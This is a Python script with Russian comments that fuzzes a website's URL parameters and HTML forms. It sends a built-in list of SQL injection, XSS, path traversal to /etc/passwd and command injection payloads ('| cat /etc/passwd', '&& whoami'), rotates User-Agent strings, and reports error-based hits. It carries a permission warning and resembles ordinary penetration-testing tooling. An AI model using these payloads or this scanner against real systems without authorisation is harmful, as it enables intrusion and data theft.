import requests
from bs4 import BeautifulSoup
import urllib.parse
from typing import List, Dict, Set
import time
import random

class WebParameterFuzzer:
    def __init__(self, base_url: str, delay: float = 0.5):
        self.base_url = base_url
        self.delay = delay
        self.session = requests.Session()
        
        # Полезные нагрузки для фаззинга
        self.payloads = [
            # SQL инъекции
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "1' ORDER BY 1--",
            
            # XSS атаки
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            
            # Path traversal
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # Командная инъекция
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            
            # Буферный переполнение
            "A" * 1000,
            "%s" * 50,
            
            # Специальные символы
            "../../",
            "\\..\\",
            "<!--",
            "../",
            "..\\",
            
            # Пустые и специальные значения
            "",
            "null",
            "undefined",
            "true",
            "false"
        ]
        
        # Заголовки User-Agent для ротации
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]

    def extract_parameters_from_url(self, url: str) -> Dict[str, str]:
        """Извлечение параметров из URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        # Преобразуем списки в строки (берем первое значение)
        return {key: values[0] for key, values in params.items() if values}

    def extract_forms(self, url: str) -> List[Dict]:
        """Извлечение всех форм со страницы"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'type': input_tag.get('type', 'text'),
                        'name': input_tag.get('name', ''),
                        'value': input_tag.get('value', '')
                    }
                    form_data['inputs'].append(input_data)
                
                forms.append(form_data)
            
            return forms
            
        except Exception as e:
            print(f"Ошибка при извлечении форм: {e}")
            return []

    def fuzz_url_parameters(self, url: str) -> Dict[str, List[Dict]]:
        """Фаззинг параметров URL"""
        results = {'vulnerabilities': []}
        base_params = self.extract_parameters_from_url(url)
        
        if not base_params:
            print("Не найдено параметров для фаззинга")
            return results
        
        for param_name, original_value in base_params.items():
            print(f"Фаззинг параметра: {param_name}")
            
            for payload in self.payloads:
                try:
                    # Создаем копию параметров и заменяем значение
                    fuzzed_params = base_params.copy()
                    fuzzed_params[param_name] = payload
                    
                    # Собираем URL с фаззнутыми параметрами
                    parsed_url = urllib.parse.urlparse(url)
                    fuzzed_query = urllib.parse.urlencode(fuzzed_params)
                    fuzzed_url = urllib.parse.urlunparse(
                        parsed_url._replace(query=fuzzed_query)
                    )
                    
                    # Отправляем запрос
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    response = self.session.get(fuzzed_url, headers=headers)
                    
                    # Анализируем ответ
                    vulnerability = self.analyze_response(
                        response, param_name, payload, original_value
                    )
                    
                    if vulnerability:
                        results['vulnerabilities'].append(vulnerability)
                        print(f"Найдена уязвимость: {vulnerability['type']} в параметре {param_name}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    print(f"Ошибка при фаззинге параметра {param_name}: {e}")
        
        return results

    def fuzz_forms(self, url: str) -> Dict[str, List[Dict]]:
        """Фаззинг HTML форм"""
        results = {'vulnerabilities': []}
        forms = self.extract_forms(url)
        
        if not forms:
            print("Не найдено форм для фаззинга")
            return results
        
        for form_idx, form in enumerate(forms):
            print(f"Фаззинг формы #{form_idx + 1}")
            
            # Определяем URL для отправки формы
            form_url = form['action']
            if not form_url.startswith('http'):
                form_url = urllib.parse.urljoin(url, form_url)
            
            for input_field in form['inputs']:
                if not input_field['name']:  # Пропускаем поля без имени
                    continue
                    
                print(f"  Фаззинг поля: {input_field['name']}")
                
                for payload in self.payloads:
                    try:
                        # Подготавливаем данные формы
                        form_data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    form_data[field['name']] = payload
                                else:
                                    form_data[field['name']] = field['value']
                        
                        # Отправляем запрос
                        headers = {'User-Agent': random.choice(self.user_agents)}
                        
                        if form['method'] == 'post':
                            response = self.session.post(
                                form_url, 
                                data=form_data, 
                                headers=headers
                            )
                        else:
                            response = self.session.get(
                                form_url, 
                                params=form_data, 
                                headers=headers
                            )
                        
                        # Анализируем ответ
                        vulnerability = self.analyze_response(
                            response, input_field['name'], payload, input_field['value']
                        )
                        
                        if vulnerability:
                            vulnerability['form_index'] = form_idx
                            results['vulnerabilities'].append(vulnerability)
                            print(f"  Найдена уязвимость: {vulnerability['type']} в поле {input_field['name']}")
                        
                        time.sleep(self.delay)
                        
                    except Exception as e:
                        print(f"  Ошибка при фаззинге поля {input_field['name']}: {e}")
        
        return results

    def analyze_response(self, response: requests.Response, param_name: str, 
                        payload: str, original_value: str) -> Dict:
        """Анализ ответа на наличие уязвимостей"""
        vulnerability = None
        content = response.text.lower()
        
        # Проверка на SQL инъекции
        sql_errors = [
            "sql syntax", "mysql", "ora-", "microsoft odbc", 
            "postgresql", "sqlite", "warning: mysql"
        ]
        
        if any(error in content for error in sql_errors):
            vulnerability = {
                'type': 'SQL Injection',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.content)
            }
        
        # Проверка на XSS (упрощенная)
        elif payload.lower() in content and any(xss_indicator in payload.lower() for xss_indicator in ['script', 'onerror', 'javascript']):
            vulnerability = {
                'type': 'Potential XSS',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.content)
            }
        
        # Проверка на path traversal
        elif response.status_code == 200 and any(traversal_indicator in content for traversal_indicator in ['root:', 'bin/bash', 'etc/passwd']):
            vulnerability = {
                'type': 'Path Traversal',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.content)
            }
        
        # Необычные коды ответа
        elif response.status_code >= 500:
            vulnerability = {
                'type': 'Server Error',
                'parameter': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.content)
            }
        
        return vulnerability

    def run_fuzzing(self, include_forms: bool = True) -> Dict:
        """Запуск полного процесса фаззинга"""
        print(f"Запуск фаззинга для: {self.base_url}")
        results = {
            'url': self.base_url,
            'url_parameters_results': {},
            'forms_results': {},
            'summary': {}
        }
        
        # Фаззинг параметров URL
        print("\n=== Фаззинг параметров URL ===")
        results['url_parameters_results'] = self.fuzz_url_parameters(self.base_url)
        
        # Фаззинг форм
        if include_forms:
            print("\n=== Фаззинг HTML форм ===")
            results['forms_results'] = self.fuzz_forms(self.base_url)
        
        # Сводка
        total_vulns = (
            len(results['url_parameters_results']['vulnerabilities']) +
            len(results['forms_results']['vulnerabilities'])
        )
        
        results['summary'] = {
            'total_vulnerabilities_found': total_vulns,
            'url_parameters_vulnerabilities': len(results['url_parameters_results']['vulnerabilities']),
            'forms_vulnerabilities': len(results['forms_results']['vulnerabilities'])
        }
        
        print(f"\n=== Сводка ===")
        print(f"Всего найдено уязвимостей: {total_vulns}")
        print(f"В параметрах URL: {results['summary']['url_parameters_vulnerabilities']}")
        print(f"В формах: {results['summary']['forms_vulnerabilities']}")
        
        return results

# Пример использования
if __name__ == "__main__":
    # Важно: используйте только тестовые сайты, на которые у вас есть разрешение!
    test_url = "https://example.com/test.php?id=1&search=test"
    
    fuzzer = WebParameterFuzzer(test_url, delay=0.3)
    results = fuzzer.run_fuzzing()
    
    # Вывод результатов
    print("\nДетали найденных уязвимостей:")
    for vuln_type in ['url_parameters_results', 'forms_results']:
        for vulnerability in results[vuln_type]['vulnerabilities']:
            print(f"- {vulnerability['type']} в параметре '{vulnerability['parameter']}'")
            print(f"  Payload: {vulnerability['payload']}")
            print(f"  Status: {vulnerability['status_code']}")